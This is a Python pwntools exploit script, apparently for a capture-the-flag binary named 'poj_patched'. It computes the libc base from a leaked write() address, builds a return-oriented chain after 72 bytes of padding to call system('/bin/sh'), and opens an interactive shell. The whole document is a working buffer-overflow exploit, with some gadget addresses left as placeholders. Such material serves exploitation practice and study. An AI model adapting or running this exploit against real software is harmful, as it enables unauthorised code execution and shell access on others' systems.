from pwn import *

# Configuration
context(arch='amd64', os='linux')
binary = ELF('./poj_patched')

# Leak addresses (from your GDB output)
write_leak = 0x7ffff7edd4d0

# Libc setup
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Ensure this matches the challenge's libc
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))

# Calculate libc base and required addresses
libc_base = write_leak - write_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

log.info(f"Libc base: {hex(libc_base)}")
log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Gadgets
pop_rax_ret = 0x114d          # Replace with actual gadget address
pop_rdi_jmp_rax = 0x1156      # Replace with actual gadget address
call_rax = 0x1010             # Replace with actual gadget address

# Craft payload
offset = 72
payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(system_addr)
payload += p64(pop_rdi_jmp_rax)
payload += p64(bin_sh_addr)
payload += p64(call_rax)

# Send the payload
p = process('./poj_patched')

# Wait for the prompt and send payload
p.recvuntil('Write() address : ')  # Adjust based on actual prompt
p.recvline()  # Discard the write address line
p.sendline(payload)

# Get interactive shell
p.interactive()